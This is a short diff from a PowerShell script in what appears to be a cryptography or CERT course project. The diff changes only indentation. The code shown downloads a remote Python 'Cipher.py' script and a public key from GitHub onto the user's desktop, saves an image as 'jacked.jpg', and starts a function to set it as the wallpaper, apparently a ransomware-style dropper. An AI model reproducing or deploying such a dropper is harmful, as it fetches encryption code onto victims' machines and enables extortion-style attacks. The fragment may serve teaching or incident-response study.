@@ -8,7 +8,7 @@ Invoke-Command -ScriptBlock {
 	$urlsc = 'https://raw.githubusercontent.com/El3ctrix/Proyecto-Cripto-CERT/main/Cipher.py'
 	$urlpk = 'https://raw.githubusercontent.com/El3ctrix/Proyecto-Cripto-CERT/main/public.pem'
 	$urlimg = 'https://github.com/El3ctrix/Proyecto-Cripto-CERT/raw/main/wallpaper.jpg'
-        Invoke-WebRequest -Uri $urlsc -OutFile $Env:userprofile\Escritorio\script.py
+    Invoke-WebRequest -Uri $urlsc -OutFile $Env:userprofile\Escritorio\script.py
 	Invoke-WebRequest -Uri $urlpk -OutFile $Env:userprofile\Escritorio\public.pem
 	Invoke-WebRequest -Uri $urlimg -OutFile $Env:userprofile\Escritorio\jacked.jpg
 	Function Set-WallPaper($Image) {
